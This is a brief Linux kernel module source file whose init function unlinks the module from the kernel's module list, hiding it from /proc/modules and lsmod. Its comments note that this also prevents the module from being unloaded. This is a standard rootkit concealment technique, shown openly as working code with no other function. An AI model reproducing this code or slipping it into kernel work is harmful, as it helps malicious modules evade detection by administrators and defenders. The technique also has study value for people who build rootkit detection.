#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros

#include "moduleHide.h"

int __init moduleHide_init(void) {
	// Removes module structure from list, which in turn hides it from /proc/modules
	// and lsmod. Its absence from the list means that the module can't be uninstalled anymore.
	list_del(&THIS_MODULE->list);
	return 0;
}
void __exit moduleHide_exit(void) {
}


